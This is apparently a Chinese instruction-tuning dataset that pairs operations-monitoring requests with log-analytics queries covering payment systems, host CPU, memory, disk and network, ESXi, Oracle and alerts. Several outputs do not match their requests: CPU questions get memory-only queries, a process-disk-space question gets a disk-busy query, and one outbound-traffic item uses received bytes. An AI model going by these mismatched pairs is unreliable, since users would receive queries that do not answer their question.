{"input": "每 10 分钟从定时任务索引里统计来账报文最大耗时指标趋势", "instruction": "查询农信银支付前置(mfe)系统数据，进行如下统计", "output": "_index:schedule schedule_name:农信银支付前置来账耗时 | bucket timestamp span=10m as ts | stats max(cost) as _max by msgcd,ts"}
{"input": "每 10 分钟从定时任务索引里统计往账报文最大耗时指标趋势", "instruction": "查询农信银支付前置(mfe)系统数据，进行如下统计", "output": "_index:schedule schedule_name:农信银支付前置往账耗时 | bucket timestamp span=10m as ts | stats max(cost) as _max by msgcd,ts"}
{"input": "搜索条件为 tranCode 字段值不等于 BUP90055，level 为 T 或 D，且 type 为开始交易或结束交易。然后按交易码 tranCode、交易流水号 seqNo 分组统计每笔交易的最大时间和最小时间。二者相减得到每笔交易的耗时，最后计算每 10 分钟内的平均耗时和最大耗时。", "instruction": "查询农信银支付清算系统(mps)数据，进行如下统计", "output": "sourcetype:mps NOT tranCode:BUP90055 (level:T OR level:D) (type:结束交易 OR type:开始交易)| stats max(timestamp) as _max,min(timestamp) as _min by seqNo,tranCode| eval cost=_max-_min| bucket _min span=10m as ts| stats avg(cost) as _avg,max(cost) as _Max by ts| rename _avg as \"平均耗时\",_Max as \"最大耗时\""}
{"input": "按每小时分桶统计Oracle_表空间变化趋势图", "instruction": "Oracle数据，编写查询语句实现如下分析场景", "output": " tag:tablespaces |eval json.USED1=todouble(json.USED) |bucket timestamp span=1h as ts |stats avg(json.USED1) as USED by ts,json.TABLESPACE_NAME |rename json.TABLESPACE_NAME as TABLESPACE_NAME \n |eval time=formatdate(ts,\"HH:mm\")"}
{"input": "按每小时分桶统计今天的工作无关上网耗时趋势", "instruction": "深信服上网行为审计数据，编写查询语句实现如下分析场景", "output": "starttime=\"now/d\" endtime=\"now\" tag:onlinetime|eval time=tolong(access_control.seconds)|bucket timestamp span=1h as ts|stats sum(time) as onlinetime by ts,access_control.servname|where access_control.servname==\"P2P流媒体\" || access_control.servname==\"移动终端应用\" || access_control.servname==\"P2P\" || access_control.servname==\"Web流媒体\"  || access_control.servname==\"购物\" || access_control.servname==\"游戏\" || access_control.servname==\"互联网金融\" || access_control.servname==\"微博\""}
{"input": "按每小时分桶统计日志易Agent采集日志量TOP10", "instruction": "日志易agent监控数据，编写查询语句实现如下分析场景", "output": "source:* AND [[source:*|stats sum(raw_message_length) as sum_ by ip|sort by sum_|limit 10 |fields ip]] | bucket timestamp span=1h as ts|stats sum(raw_message_length) as sum_ by ip,ts|rename sum_ as \"日志量(字节)\""}
{"input": "按每5分钟分桶统计实时连接数趋势图", "instruction": "网关_koal_ssl数据，编写查询语句实现如下分析场景", "output": "tag:koal_ssl AND ssl.oidname:tcpCurrEstab |eval values = tolong(ssl.oidvalue) |bucket timestamp span=5m as ts |stats max(values)  as values by ts |rename values as \"实时连接数\""}
{"input": "", "instruction": "从用户使用PV的定时任务结果中统计每天的趋势", "output": "_index:schedule schedule_name:用户使用PV | bucket timestamp span=1d as ts  |stats sum(cnt) as value by ts |rename value as \"用户访问PV\""}
{"input": "", "instruction": "从用户使用 UV 的定时任务结果中统计每天的趋势", "output": "_index:schedule schedule_name:用户使用UV | bucket timestamp span=1d as ts  |stats sum(cnt) as value by ts |rename value as \"用户访问UV\""}
{"input": "可用内存趋势AIX，按 1 分钟统计和绘制曲线图", "instruction": "查询农信银支付前置(mfe)系统数据，进行如下统计", "output": "type:MEM tag:mps | bucket timestamp span=1m as ts | eval Real_free_MB=todouble(Real_free_MB) | stats avg(Real_free_MB) as Real_free_MB by ip,ts"}
{"input": "磁盘读AIX，按 1 分钟统计和绘制曲线图", "instruction": "查询农信银支付前置(mfe)系统数据，进行如下统计", "output": "type:DISKREAD tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "磁盘写AIX，按 1 分钟统计和绘制曲线图", "instruction": "查询农信银支付前置(mfe)系统数据，进行如下统计", "output": "type:DISKWRITE tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "磁盘繁忙AIX，按 1 分钟统计和绘制曲线图", "instruction": "查询农信银支付前置(mfe)系统数据，进行如下统计", "output": "type:DISKBUSY tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "网卡流量AIX，按 1 分钟统计和绘制曲线图", "instruction": "查询农信银支付前置(mfe)系统数据，进行如下统计", "output": "type:NET tag:mps| eval value=todouble(value) | bucket timestamp span=1m as ts | stats avg(value) as value by device,value,ts"}
{"input": "磁盘使用率AIX，按 1 分钟统计和绘制曲线图", "instruction": "查询农信银支付前置(mfe)系统数据，进行如下统计", "output": "type:JFSFILE tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "可用内存趋势AIX，按 1 分钟统计趋势曲线图", "instruction": "查询银联前置(cupp)系统数据，进行如下统计", "output": "type:MEM tag:mps | bucket timestamp span=1m as ts | eval Real_free_MB=todouble(Real_free_MB) | stats avg(Real_free_MB) as Real_free_MB by ip,ts"}
{"input": "磁盘读AIX，按 1 分钟统计趋势曲线图", "instruction": "查询银联前置(cupp)系统数据，进行如下统计", "output": "type:DISKREAD tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "磁盘写AIX，按 1 分钟统计趋势曲线图", "instruction": "查询银联前置(cupp)系统数据，进行如下统计", "output": "type:DISKWRITE tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "磁盘繁忙AIX，按 1 分钟统计趋势曲线图", "instruction": "查询银联前置(cupp)系统数据，进行如下统计", "output": "type:DISKBUSY tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "网卡流量AIX，按 1 分钟统计趋势曲线图", "instruction": "查询银联前置(cupp)系统数据，进行如下统计", "output": "type:NET tag:mps| eval value=todouble(value) | bucket timestamp span=1m as ts | stats avg(value) as value by device,value,ts"}
{"input": "磁盘使用率AIX，按 1 分钟统计趋势曲线图", "instruction": "查询银联前置(cupp)系统数据，进行如下统计", "output": "type:JFSFILE tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "可用内存趋势AIX，按小时进行分 IP 地址趋势统计", "instruction": "查询农信银支付清算系统(mps)数据，进行如下统计", "output": "type:MEM tag:mps | bucket timestamp span=1h as ts | eval Real_free_MB=todouble(Real_free_MB) | stats avg(Real_free_MB) as Real_free_MB by ip,ts"}
{"input": "磁盘读AIX，按小时进行分设备趋势统计", "instruction": "查询农信银支付清算系统(mps)数据，进行如下统计", "output": "type:DISKREAD tag:mps | bucket timestamp span=1h as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "磁盘写AIX，按小时进行分设备趋势统计", "instruction": "查询农信银支付清算系统(mps)数据，进行如下统计", "output": "type:DISKWRITE tag:mps | bucket timestamp span=1h as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "磁盘繁忙AIX，按小时进行分设备趋势统计", "instruction": "查询农信银支付清算系统(mps)数据，进行如下统计", "output": "type:DISKBUSY tag:mps | bucket timestamp span=1h as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "网卡流量AIX，按小时分设备趋势进行统计", "instruction": "查询农信银支付清算系统(mps)数据，进行如下统计", "output": "type:NET tag:mps| eval value=todouble(value) | bucket timestamp span=1h as ts | stats avg(value) as value by device,value,ts"}
{"input": "磁盘使用率AIX，按小时分设备进行趋势统计", "instruction": "查询农信银支付清算系统(mps)数据，进行如下统计", "output": "type:JFSFILE tag:mps | bucket timestamp span=1h as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "每10分钟统计告警趋势", "instruction": "日志易告警监控-有数据数据，编写查询语句实现如下分析场景", "output": "_index:monitor * NOT issue_alert:false |bucket timestamp span=10m as ts|stats count() as cnt by alert_level,ts"}
{"input": "按每30分钟分桶统计锐捷交换机事件趋势图", "instruction": "锐捷交换机日志数据，编写查询语句实现如下分析场景", "output": "tag:ruijie | bucket timestamp span=30m as ts | stats count() by ts | eval time = formatdate(ts,\"HH:mm\")"}
{"input": "按每30分钟分桶统计核心_日志量趋势分布图", "instruction": "核心_bea数据，编写查询语句实现如下分析场景", "output": "tag:lis |bucket timestamp span=30m as ts |stats count() by ts,ip "}
{"input": "按每30分钟分桶统计核心lis_错误事务量分布", "instruction": "核心_bea数据，编写查询语句实现如下分析场景", "output": "tag:lis error|eval instance = coalesce(tomcat.instance,bea.instance,other.instance)|bucket timestamp span=30m as ts |stats count() by ts,instance"}
{"input": "当天告警趋势", "instruction": "综合态势感知数据，编写查询语句实现如下分析场景", "output": "starttime=\"now/d\" _index:monitor issue_alert:true  |bucket timestamp span=10m as ts|stats count() as cnt by alert_level,ts"}
{"input": "按每 5 分钟和 event_id分组统计", "instruction": "Exchange_邮件收发趋势", "output": "tag:msgtrk tag:msgtrk AND (msgtrk.event_id:SEND OR msgtrk.event_id:RECEIVE)|bucket timestamp span=5m as ts |stats count() as ct by ts,msgtrk.event_id"}
{"input": "按每 5 分钟分组统计", "instruction": "Exchange垃圾邮件数量趋势统计，统计结果重命名为垃圾邮件数量", "output": "tag:msgtrk msgtrk.recipient_status:\"垃圾邮件\" |bucket timestamp span=5m as ts |stats count() as ct by ts |rename ct as \"垃圾邮件数量\""}
{"input": "", "instruction": "我想要知道表空间的使用情况和大小，以及每小时平均使用的大小。请帮我把这些信息列出。", "output": " tag:tablespaces |eval json.USED1=todouble(json.USED) |bucket timestamp span=1h as ts |stats avg(json.USED1) as USED by ts,json.TABLESPACE_NAME | eval time=formatdate(ts,\"HH:mm\")"}
{"input": "", "instruction": "我想要知道系统的磁盘读取情况，以及每秒钟的平均值。请告诉我如何获取这些信息。", "output": "type:DISKREAD tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "", "instruction": "我想要知道 CPU 使用率和内存使用情况。请告诉我每一分钟的平均值和当前总量。同时也希望你能给出每个 IP 地址的统计信息。", "output": "type:MEM tag:mps | bucket timestamp span=1m as ts | eval Real_free_MB=todouble(Real_free_MB) | stats avg(Real_free_MB) as Real_free_MB by ip,ts"}
{"input": "", "instruction": "我想要知道昨天到今天之前有多少条告警信息属于不同级别的情况，并且每分钟统计一次数量。", "output": "starttime=\"now-1d/d\" endtime=\"now/d\" _index:monitor issue_alert:true  |bucket timestamp span=10m as ts|stats count() as cnt by alert_level,ts"}
{"input": "", "instruction": "我想问的是 CPU 使用率和内存使用量的平均值，时间间隔为一分钟，按 IP 和时间对结果进行汇总。", "output": "type:MEM tag:mps | bucket timestamp span=1m as ts | eval Real_free_MB=todouble(Real_free_MB) | stats avg(Real_free_MB) as Real_free_MB by ip,ts"}
{"input": "", "instruction": "我想问的是磁盘写入的情况？比如统计每个设备上每分钟的平均值。", "output": "type:DISKWRITE tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "", "instruction": "我想问的是我的磁盘空间不够了，你能帮忙找出哪些进程或者应用占用了太多的空间吗？", "output": "type:DISKBUSY tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "", "instruction": "我想问的是磁盘读写情况，比如说，我只要知道各个设备在每个时间段内的平均 IOPS 就行了。", "output": "type:DISKREAD tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "", "instruction": "我想问的是磁盘写入的情况", "output": "type:DISKWRITE tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "", "instruction": "我想要知道我的磁盘空间是否有问题，你能帮我检查一下吗？我在询问以下内容：1. 查看磁盘 I/O 使用情况2. 根据设备名称和时间范围查看磁盘使用量3. 对结果进行平均计算并按设备和时间分组", "output": "type:DISKBUSY tag:mps | bucket timestamp span=1m as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "", "instruction": "我想问的是 CPU 使用率和内存使用量的平均值，时间段为一小时，按 IP 和时间对结果进行分组。", "output": "type:MEM tag:mps | bucket timestamp span=1h as ts | eval Real_free_MB=todouble(Real_free_MB) | stats avg(Real_free_MB) as Real_free_MB by ip,ts"}
{"input": "", "instruction": "我想问的是磁盘读取的情况？比如说只统计每个小时内的情况。", "output": "type:DISKREAD tag:mps | bucket timestamp span=1h as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "", "instruction": "我想要知道我的磁盘写入速度在过去每小时是多少。请帮我把这些数据统计一下。", "output": "type:DISKWRITE tag:mps | bucket timestamp span=1h as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "", "instruction": "我想问的是磁盘是否繁忙，如果是的话，请告诉我哪些设备和时间段发生了问题。", "output": "type:DISKBUSY tag:mps | bucket timestamp span=1h as ts | eval value=todouble(value) | stats avg(value) as value by device,ts"}
{"input": "", "instruction": "我想问的是，最近一段时间系统的告警数量有没有异常增长？如果有的话，分别在哪些环节出现了问题？", "output": "_index:monitor * NOT issue_alert:false |bucket timestamp span=10m as ts|stats count() as cnt by alert_level,ts"}
{"input": "每10分钟统计192.168.1.253内存使用率趋势", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats AND 192.168.1.253 | bucket timestamp span=10m as ts | stats avg(json.Mem.used_percent) as _mem by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval Mem.used_percent=format(\"%.2f\",_mem) | fields ip,hour,Mem.used_percent,ts"}
{"input": "每10分钟统计192.168.1.253CPU使用率趋势", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats AND 192.168.1.253| bucket timestamp span=10m as ts | stats avg(json.cpu.system_percent) as _system by ts,ip | eval hour = formatdate(ts,\"HH:mm\") | eval cpu_use_percent=format(\"%.2f\",_system) | fields hour,cpu_use_percent,ip,ts"}
{"input": "每10分钟统计192.168.1.253CPU使用率趋势图", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats AND 192.168.1.253| bucket timestamp span=10m as ts | stats avg(json.cpu.system_percent) as _system by ts,ip | eval hour = formatdate(ts,\"HH:mm\") | eval cpu_use_percent=format(\"%.2f\",_system) | fields hour,cpu_use_percent,ip,ts"}
{"input": "每10分钟统计192.168.1.253内存使用率趋势图", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats AND 192.168.1.253| bucket timestamp span=10m as ts | stats avg(json.Mem.used_percent) as _mem by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval Mem.used_percent=format(\"%.2f\",_mem) | fields ip,hour,Mem.used_percent,ts"}
{"input": "按每小时分桶统计all虚拟机cpu", "instruction": "VMware_Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:app2 source:VirtualMachine*   |bucket timestamp span=1h as ts |eval time=formatdate(ts,\"HH:mm\")| stats last(json.cpu.used.mhz) as cpu_Mhz by time,json.hostname,json.name | sort by +time"}
{"input": "按每小时分桶统计all虚拟机磁盘", "instruction": "VMware_Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:app2 source:VirtualMachine* |bucket timestamp span=1h as ts |eval time=formatdate(ts,\"HH:mm\")\t| stats last(json.storage.used.bytes) as storage by time,json.hostname,json.name | eval storage=format(\"%.3f\",storage/1024/1024/1024)|sort by +time"}
{"input": "按每小时分桶统计all虚拟机内存", "instruction": "VMware_Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:app2 source:VirtualMachine*  |bucket timestamp span=1h as ts |eval time=formatdate(ts,\"HH:mm\")\t |  stats last(json.memory.used.guest.bytes) as memory by time,json.hostname,json.name,json.memory.total.guest.bytes|eval usage=format(\"%.3f\",memory/json.memory.total.guest.bytes * 100)|fields time,json.hostname,json.name,usage|sort by +time"}
{"input": "按每小时分桶统计all虚拟机内存", "instruction": "主中心Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:dmz_master   source:VirtualMachine*  |bucket timestamp span=1h as ts |eval time=formatdate(ts,\"HH:mm\")\t |  stats last(json.memory.used.guest.bytes) as memory by time,json.hostname,json.name,json.memory.total.guest.bytes|eval usage=format(\"%.3f\",memory/json.memory.total.guest.bytes * 100)|fields time,json.hostname,json.name,usage|sort by +time"}
{"input": "按每小时分桶统计all虚拟机内存", "instruction": "Esxi性能监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:dmz_backup   source:VirtualMachine*  |bucket timestamp span=1h as ts |eval time=formatdate(ts,\"HH:mm\")\t |  stats last(json.memory.used.guest.bytes) as memory by time,json.hostname,json.name,json.memory.total.guest.bytes|eval usage=format(\"%.3f\",memory/json.memory.total.guest.bytes * 100)|fields time,json.hostname,json.name,usage|sort by +time"}
{"input": "按每分钟分桶统计esxi宿主机cpu使用率", "instruction": "VMware_Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:app2 source:\"HostSystem_https://11.36.2.136:443/sdk\" |bucket timestamp span=1m as ts| stats dc(json.hostname) by ts,json.hostname,json.cpu.total.mhz,json.cpu.free.mhz | eval usage=format(\"%.3f\",(json.cpu.total.mhz-json.cpu.free.mhz)/json.cpu.total.mhz* 100)"}
{"input": "按每分钟分桶统计esxi宿主机内存使用百分比", "instruction": "VMware_Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:app2 source:HostSystem* |bucket timestamp span=1m as ts| stats dc(json.hostname) by ts,json.hostname,json.memory.total.bytes,json.memory.free.bytes | eval use_percent=format(\"%.3f\",(json.memory.total.bytes-json.memory.free.bytes)/json.memory.total.bytes* 100)"}
{"input": "按每分钟分桶统计esxi宿主机cpu使用率", "instruction": "主中心Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:dmz_master source:HostSystem_* |bucket timestamp span=1m as ts| stats dc(json.hostname) by ts,json.hostname,json.cpu.total.mhz,json.cpu.free.mhz | eval usage=format(\"%.3f\",(json.cpu.total.mhz-json.cpu.free.mhz)/json.cpu.total.mhz* 100)"}
{"input": "按每分钟分桶统计esxi宿主机内存使用率", "instruction": "主中心Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:dmz_master source:HostSystem* |bucket timestamp span=1m as ts| stats dc(json.hostname) by ts,json.hostname,json.memory.total.bytes,json.memory.free.bytes | eval use_percent=format(\"%.3f\",(json.memory.total.bytes-json.memory.free.bytes)/json.memory.total.bytes* 100)"}
{"input": "按每分钟分桶统计esxi宿主机cpu使用率", "instruction": "Esxi性能监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:dmz_backup source:\"HostSystem*\" |bucket timestamp span=1m as ts| stats dc(json.hostname) by ts,json.hostname,json.cpu.total.mhz,json.cpu.free.mhz | eval usage=format(\"%.3f\",(json.cpu.total.mhz-json.cpu.free.mhz)/json.cpu.total.mhz* 100)"}
{"input": "按每分钟分桶统计esxi宿主机内存使用百分比", "instruction": "Esxi性能监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:dmz_backup source:HostSystem* |bucket timestamp span=1m as ts| stats dc(json.hostname) by ts,json.hostname,json.memory.total.bytes,json.memory.free.bytes | eval use_percent=format(\"%.3f\",(json.memory.total.bytes-json.memory.free.bytes)/json.memory.total.bytes* 100)"}
{"input": "按每5分钟分桶统计各主机的CPU高使用率，CPU 空闲率低于 20%认为是使用率偏高，最后计算主机独立数", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.cpu.idle_percent) as _avg by ip,ts \n\t| where _avg <=20\n\t| stats dc(ip) as _dc "}
{"input": "按每5分钟分桶统计各主机的网络高入口流量，大于 50MB 认为是高，最后计算主机独立数", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.nets.eth0.bytes_recv) as _avg by ts,ip\n\t| where _avg / (1024 * 1024) > 50 | stats dc(ip) as _dc "}
{"input": "按每5分钟分桶统计各主机的网络高出口流量，大于 50MB 认为是高，最后计算主机独立数", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.nets.eth0.bytes_sent) as _avg by ts,ip\n\t| where _avg / (1024 * 1024) > 50 | stats dc(ip) as _dc"}
{"input": "按每5分钟分桶统计各主机的网络高出口流量，大于 50MB 认为是高，保留每个主机地址的最新一条数据，流量按小数点后 2 位显示MB单位", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.nets.eth0.bytes_sent) as _avg by ts,ip \n\t| where _avg / (1024 * 1024) > 50\n\t| sort by ts \n\t| dedup 1 ip \n\t| eval bytes_sent=format(\"%.2fMB\",_avg/1024/1024) "}
{"input": "按每5分钟分桶统计各主机的网络高入口流量，大于 50MB 认为是高，保留每个主机地址的最新一条记录，流量按小数点后保留 2 位显示 KB 单位", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.nets.eth0.bytes_recv) as _avg by ts,ip \n\t| where _avg / (1024 * 1024) > 50\n\t| sort by ts \n\t| dedup 1 ip \n\t| eval bytes_recv=format(\"%.2fKB\",_avg/1024) "}
{"input": "分主机名，按每5分钟分桶统计各磁盘写IO_TOP5", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_disk_io_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.io_stat.wkB_s) as _avg_w by hostname,json.name \n\t| sort by _avg_w\n\t| limit 5\n\t| eval avg_w=format(\"%.2fkB/s\",_avg_w)"}
{"input": "分主机名按每5分钟分桶统计各磁盘读IO_TOP5", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_disk_io_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.io_stat.rkB_s) as _avg_r by hostname,json.name \n\t| sort by _avg_r\n| limit 5\n\t| eval avg_r=format(\"%.2fkB/s\",_avg_r) "}
{"input": "按每5分钟分桶统计每个 IP 的内存使用率，过滤大于 80% 认为是高的数据，最后计算 IP 的独立数", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.Mem.used_percent) as _avg by ip,ts \n\t| where _avg >=80 \n\t| stats dc(ip) as _dc "}
{"input": "按每5分钟分桶统计内存高使用率主机列表，大于 80% 认为是高", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.Mem.used_percent) as _avg by ip,hostname \n\t| where _avg >= 80 \n\t| stats dc(ip) as _dc by ip,hostname,_avg\n\t| eval Mem.used_percent=format(\"%.2f%%\",_avg)"}
{"input": "按每5分钟分桶统计CPU高使用率主机列表，大于 80% 认为是高", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats  \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.cpu.idle_percent) as _avg by ts,ip,hostname \n\t| where _avg <=20 \n\t| sort by ts \n\t| dedup 1 ip \n\t| eval cpu.use_percent=format(\"%.2f%%\",100-_avg) "}
{"input": "按每5分钟分桶统计192.168.1.253各磁盘的读IO趋势图", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_disk_io_stats AND 192.168.1.253 | bucket timestamp span=5m as ts | stats avg(json.io_stat.rkB_s) as _avg_r by json.name,ts"}
{"input": "按每5分钟分桶统计192.168.1.253各磁盘的写IO趋势图", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_disk_io_stats AND 192.168.1.253| bucket timestamp span=5m as ts | stats avg(json.io_stat.wkB_s) as _avg_r by json.name,ts"}
{"input": "按每5分钟分桶统计各 IP 的 CPU空闲率，过滤低于 20%的数据，然后计算 IP 的独立数", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.cpu.idle_percent) as _avg by ip,ts \n\t| where _avg <=20\n\t| stats dc(ip) as _dc "}
{"input": "按每5分钟分桶统计各 IP 的内存使用率，过滤大于 80%的数据，然后计算 IP 的独立数", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.Mem.used_percent) as _avg by ip,ts \n\t| where _avg >=80 \n\t| stats dc(ip) as _dc"}
{"input": "按每5分钟分桶统计各 IP 地址的网络高入口流量，过滤大于 50MB 的指标并计算 IP 独立数", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg('json.nets.本地连接.bytes_recv') as _avg by ts,ip\n\t| where _avg / (1024 * 1024) > 50 \n\t| sort by ts \n\t| stats dc(ip) as _dc "}
{"input": "按每5分钟分桶统计各 ip 计网络高出口流量，过滤大于 50MB 的数据并计算 IP 独立数", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg('json.nets.本地连接.bytes_recv') as _avg by ts,ip\n\t| where _avg / (1024 * 1024) > 50 \n\t| sort by ts \n\t| stats dc(ip) as _dc "}
{"input": "按每5分钟分桶统计网络高入口流量主机列表", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg('json.nets.本地连接.bytes_recv') as _avg by ts,ip,hostname \n\t| where _avg / (1024 * 1024) > 50\n\t| sort by ts \n\t| dedup 1 ip \n\t| eval bytes_recv=format(\"%.2fKB\",_avg/1024)"}
{"input": "按每5分钟分桶统计网络高出口流量主机列表", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg('json.nets.本地连接.bytes_sent') as _avg by ts,ip,hostname \n\t| where _avg / (1024 * 1024) > 50\n\t| sort by ts \n\t| dedup 1 ip \n\t| eval bytes_sent=format(\"%.2fKB\",_avg/1024)"}
{"input": "按每5分钟分桶统计内存高使用率主机列表", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.Mem.used_percent) as _avg by ip,hostname \n\t| where _avg >= 80 \n\t| stats dc(ip) as _dc by ip,hostname,_avg|dedup 1 ip\n\t| eval Mem.used_percent=format(\"%.2f%%\",_avg)"}
{"input": "按每5分钟分桶统计CPU高使用率主机列表", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats  \n\t| bucket timestamp span=5m as ts \n\t| stats avg(json.cpu.idle_percent) as _avg by ts,ip,hostname\n\t| where _avg <= 20 \n\t| sort by ts \n\t| dedup 1 ip\n\t| eval use_percent=format(\"%.2f%%\",100-_avg) \n\t| sort by use_percent"}
{"input": "按每5分钟分桶统计192.168.1.253每块磁盘的空闲率指标趋势图", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_disk_io_stats AND 192.168.1.253| bucket timestamp span=5m as ts | stats avg(json.percent_idle_time) as '_avg%' by json.name,ts"}
{"input": "按每 1 天和主机名称分组统计", "instruction": "数据库主机内存最大使用率趋势", "output": "appname:top_info_system_stats tag:top_info AND * |bucket timestamp span=1d as ts |stats max(json.Mem.used_percent) as max_per by ts,hostname"}
{"input": "按每 1 天和主机名称分组统计", "instruction": "数据库主机内存平均使用率趋势", "output": "appname:top_info_system_stats tag:top_info AND * |bucket timestamp span=1d as ts |stats avg(json.Mem.used_percent) as avg_per by ts,hostname"}
{"input": "按每 1 天和主机名分组统计", "instruction": "数据库主机磁盘最大使用率趋势", "output": "appname:top_info_disk_stats tag:top_info json.disk.path:\"/\" AND * |bucket timestamp span=1d as ts |stats max(json.disk.used_percent) as max_per by ts,hostname"}
{"input": "按每 1 天和主机名分组统计", "instruction": "数据库主机磁盘平均使用率趋势", "output": "appname:top_info_disk_stats tag:top_info json.disk.path:\"/\" AND * |bucket timestamp span=1d as ts |stats avg(json.disk.used_percent) as avg_per by ts,hostname"}
{"input": "按每 1 天和主机名分组统计", "instruction": "上个月数据库主机CPU平均使用率趋势", "output": "starttime=\"-1M/M\" endtime=\"now/M\" appname:top_info_system_stats tag:top_info AND * |eval per=(100-json.cpu.idle_percent)/100 |bucket timestamp span=1d as ts |stats avg(per) as avg_per by ts,hostname"}
{"input": "按每 1 天和主机名分组统计", "instruction": "上个月数据库主机CPU最大使用率趋势", "output": "starttime=\"-1M/M\" endtime=\"now/M\" appname:top_info_system_stats tag:top_info AND * |eval per=(100-json.cpu.idle_percent)/100 |bucket timestamp span=1d as ts |stats max(per) as max_per by ts,hostname"}
